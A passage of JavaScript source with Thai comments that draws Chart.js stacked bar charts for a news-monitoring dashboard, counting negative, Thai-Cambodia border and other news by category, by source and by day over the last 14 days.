 *    (จชต. จะยาวเท่ากับ 704 + 448 = 1,152 ทั้งที่มีจริง 704 และแกน X พองตาม)
 *    ซ้อนแบบนี้ความยาวแท่ง = ยอดรวมจริง และท่อนแดง = ข่าวลบพอดี
 *
 * ⚠️ นับเป็น "ข่าว" ไม่ใช่ "ประเด็น" (โดนัทเดิมนับประเด็น) — ตัวเลขต่างกันมาก
 *    เช่น จชต. 704 ข่าว แต่ 322 ประเด็น จึงเขียนกำกับไว้ใต้หัวกราฟ
 *
 * แสดงครบ 10 หมวดรวมหมวดที่เป็น 0 — "หมวดที่เงียบ" ก็เป็นข้อมูล
 */
function renderCategoryBar(newsList) {
  var agg = {};
  CATEGORY_ORDER.forEach(function (k) { agg[k] = { neg: 0, pos: 0 }; });
  newsList.forEach(function (n) {
    var c = normalizeCategory(n.category);
    if (!agg[c]) agg[c] = { neg: 0, pos: 0 };   // หมวดแปลกที่หลุดเข้ามา — ให้เห็น ไม่ให้หาย
    if (n.isNegative) agg[c].neg++; else agg[c].pos++;
  });

  var rows = Object.keys(agg).map(function (k) {
    var a = agg[k];
    return { key: k, neg: a.neg, pos: a.pos, total: a.neg + a.pos };
  }).sort(function (a, b) { return b.total - a.total; });

  var c = chartColors();

  new Chart(document.getElementById('categoryBar'), {
    type: 'bar',
    data: {
      labels: rows.map(function (r) { return r.key; }),
      datasets: [
        Object.assign({ label: 'ข่าวลบ', data: rows.map(function (r) { return r.neg; }),
          backgroundColor: c.neg, stack: 'c' }, barSeparator(c)),
        // ⭐ 4 ส.ค. 69: เดิมเป็น label 'ข่าวไม่ลบ' + c.main (เหลือง)
        //    เปลี่ยนเป็น 'ข่าวอื่นๆ' + c.soft (เขียว) เพื่อคืนเหลืองให้ไทย-กัมพูชาอย่างเดียว
        Object.assign({ label: 'ข่าวอื่นๆ', data: rows.map(function (r) { return r.pos; }),
          backgroundColor: c.soft, stack: 'c' }, barSeparator(c))
      ]
    },
    options: {
      indexAxis: 'y',
      responsive: true, maintainAspectRatio: false,
      plugins: {
        subtitle: {
          display: true,
          text: 'นับเป็นจำนวนข่าว · ความยาวแท่ง = ยอดรวมของหมวด',
          color: c.muted, font: { size: cfs(11) }, padding: { bottom: 6 }
        },
        legend: { position: 'bottom', labels: { color: c.text, font: { size: cfs(11) }, boxWidth: 12, padding: 10 } },
        tooltip: {
          callbacks: {
            // เติม "คิดเป็นกี่ % ของหมวด" ให้อ่านค่าได้โดยไม่ต้องคำนวณเอง
            afterBody: function (items) {
              var r = rows[items[0].dataIndex];
              if (!r.total) return '';
              return 'รวม ' + r.total + ' ข่าว · ข่าวลบ ' + Math.round(100 * r.neg / r.total) + '%';
            }
          }
        }
      },
      scales: {
        x: { stacked: true, ticks: { color: c.muted, precision: 0 }, grid: { color: c.grid } },
        // ⚠️ autoSkip: false บังคับให้แสดงชื่อครบทุกแถว
        //    ถ้าไม่ใส่ Chart.js จะซ่อนป้ายทิ้งเองเมื่อกล่องเตี้ย โดยไม่มีสัญญาณเตือน
        y: { stacked: true, ticks: { color: c.text, font: { size: cfs(11) }, autoSkip: false }, grid: { display: false } }
      }
    }
  });
}

function renderSourceBar(newsList) {
  var bySource = {};
  newsList.forEach(function (n) {
    var s = (n.source || 'ไม่ระบุ').trim() || 'ไม่ระบุ';
    if (!bySource[s]) bySource[s] = { total: 0, cam: 0, neg: 0, other: 0 };
    bySource[s].total++;
    if (n.isNegative) bySource[s].neg++;
    else if (n.category === 'ชายแดนไทย-กัมพูชา') bySource[s].cam++;
    else bySource[s].other++;
  });

  var top = Object.keys(bySource)
    .map(function (s) { return Object.assign({ source: s }, bySource[s]); })
    .sort(function (a, b) { return b.total - a.total; })
    .slice(0, 10);
  // ไม่ต้อง reverse — Chart.js วางรายการแรกของ labels ไว้บนสุดของแท่งแนวนอนอยู่แล้ว

  var c = chartColors();

  new Chart(document.getElementById('sourceBar'), {
    type: 'bar',
    data: {
      labels: top.map(function (t) { return t.source; }),
      datasets: [
        // ⭐ 4 ส.ค. 69: เรียงข่าวลบขึ้นก่อนให้เหมือนกันทุกกราฟ + เปลี่ยน 'ข่าวทั่วไป' เป็น 'ข่าวอื่นๆ'
        Object.assign({ label: 'ข่าวลบ', data: top.map(function (t) { return t.neg; }), backgroundColor: c.neg, stack: 's' }, barSeparator(c)),
        Object.assign({ label: 'ไทย-กัมพูชา', data: top.map(function (t) { return t.cam; }), backgroundColor: c.main, stack: 's' }, barSeparator(c)),
        Object.assign({ label: 'ข่าวอื่นๆ', data: top.map(function (t) { return t.other; }), backgroundColor: c.soft, stack: 's' }, barSeparator(c))
      ]
    },
    options: {
      indexAxis: 'y',
      responsive: true, maintainAspectRatio: false,
      plugins: {
        subtitle: {
          display: true,
          text: 'นับเป็นจำนวนข่าว (14 วันล่าสุด)',
          color: c.muted,
          font: { size: cfs(11) },
          padding: { bottom: 6 }
        },
        legend: { position: 'bottom', labels: { color: c.text, font: { size: cfs(11) }, boxWidth: 12 } }
      },
      scales: {
        x: { stacked: true, ticks: { color: c.muted, precision: 0 }, grid: { color: c.grid } },
        // ⚠️ autoSkip: false — เดิมกล่องสูง 260px ทำให้ Chart.js ซ่อนชื่อสำนักข่าวทิ้ง 5 จาก 10
        y: { stacked: true, ticks: { color: c.text, font: { size: cfs(11) }, autoSkip: false }, grid: { display: false } }
      }
    }
  });
}

function renderTrendBar(newsList) {
  var days = [];
  for (var i = 13; i >= 0; i--) {
    var d = new Date();
    d.setHours(0, 0, 0, 0);
    d.setDate(d.getDate() - i);
    days.push(d);
  }

  var camSeries = [], negSeries = [], otherSeries = [];
  var labels = days.map(function (d) { return d.getDate() + ' ' + THAI_MONTHS_ABBR[d.getMonth()]; });

  days.forEach(function (dayStart) {
    var dayEnd = new Date(dayStart.getTime() + 86400000);
    var itemsToday = newsList.filter(function (n) {
      var t = new Date(n.datetime);
      return t >= dayStart && t < dayEnd;
    });
    negSeries.push(itemsToday.filter(function (n) { return n.isNegative; }).length);
    camSeries.push(itemsToday.filter(function (n) { return !n.isNegative && n.category === 'ชายแดนไทย-กัมพูชา'; }).length);
    otherSeries.push(itemsToday.filter(function (n) { return !n.isNegative && n.category !== 'ชายแดนไทย-กัมพูชา'; }).length);
  });

  var c = chartColors();

  new Chart(document.getElementById('trendBar'), {
    type: 'bar',
    data: {
      labels: labels,
      datasets: [
        // ⭐ 4 ส.ค. 69: เรียงข่าวลบขึ้นก่อนให้เหมือนกันทุกกราฟ + เปลี่ยน 'อื่นๆ' เป็น 'ข่าวอื่นๆ'
        Object.assign({ label: 'ข่าวลบ', data: negSeries, backgroundColor: c.neg, stack: 's' }, barSeparator(c)),
        Object.assign({ label: 'ไทย-กัมพูชา', data: camSeries, backgroundColor: c.main, stack: 's' }, barSeparator(c)),
        Object.assign({ label: 'ข่าวอื่นๆ', data: otherSeries, backgroundColor: c.soft, stack: 's' }, barSeparator(c))
      ]
    },
    options: {
      responsive: true, maintainAspectRatio: false,
      plugins: {
        subtitle: {
          display: true,
          text: 'นับเป็นจำนวนข่าว',
          color: c.muted,
          font: { size: cfs(11) },
          padding: { bottom: 6 }
        },
        legend: { position: 'bottom', labels: { color: c.text, font: { size: cfs(11) }, boxWidth: 12 } }
      },
      scales: {
        x: { stacked: true, ticks: { color: c.muted, font: { size: cfs(10) } }, grid: { display: false } },
        y: { stacked: true, ticks: { color: c.muted, precision: 0 }, grid: { color: c.grid } }
      }
    }
  });
}

loadData();
